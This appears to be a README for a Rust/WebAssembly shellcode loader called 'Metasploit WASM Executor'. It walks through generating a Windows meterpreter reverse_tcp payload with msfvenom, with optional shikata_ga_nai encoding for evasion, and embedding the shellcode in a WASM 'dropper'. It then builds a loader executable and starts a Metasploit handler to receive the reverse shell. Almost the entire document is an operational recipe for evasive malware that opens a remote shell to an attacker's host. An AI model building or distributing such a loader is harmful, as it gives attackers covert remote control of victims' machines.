# Metasploit WASM Executor

## Dependencies
```sh
cargo install wasm-pack
```

## Install `Wasm2Wat` Windows
```sh
curl -L -o wabt.tar.gz https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-windows.tar.gz
mkdir wabt && tar -xzf wabt.tar.gz -C wabt --strip-components 1
```

## Install `Wasm2Wat` Linux
```sh
curl -L -o wabt.tar.gz https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-ubuntu-20.04.tar.gz
mkdir wabt && tar -xzf wabt.tar.gz -C wabt --strip-components 1
```

- First, we need to get some shellcode from Metasploit
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f rust # -e x86/shikata_ga_nai -i {number of iterations} # OPTIONAL (For heavier encoding) 
```

- Copy the output from that command into `./wasm_dropper/src/lib.rs` 
- Name it `WASM_MEMORY_BUFFER` and change the const to be static
- `WASM_MEMORY_BUFFER` should have the following signature:

```rust
static WASM_MEMORY_BUFFER: [u8; WASM_MEMORY_BUFFER_SIZE] = [
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,
    ...
];
```

## Build the wasm binary
```sh
cd wasm_dropper && wasm-pack build --release && cd ..
```

## Now convert the wasm binary from .wasm to .wat using `wasm2wat`
```sh
./wabt/bin/wasm2wat.exe ./target/wasm32-unknown-unknown/release/wasm_dropper.wasm -o ./wasm_loader/src/wasm_dropper.wat
```

## Now build the Loader
```sh
cd wasm_loader && cargo build --release && cd ..
```

## The Loader Binary is now in `./target/release/wasm_loader.exe`

## Make sure we have a Metasploit handler running
```sh
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
set EnableStageEncoding true
exploit -j
```

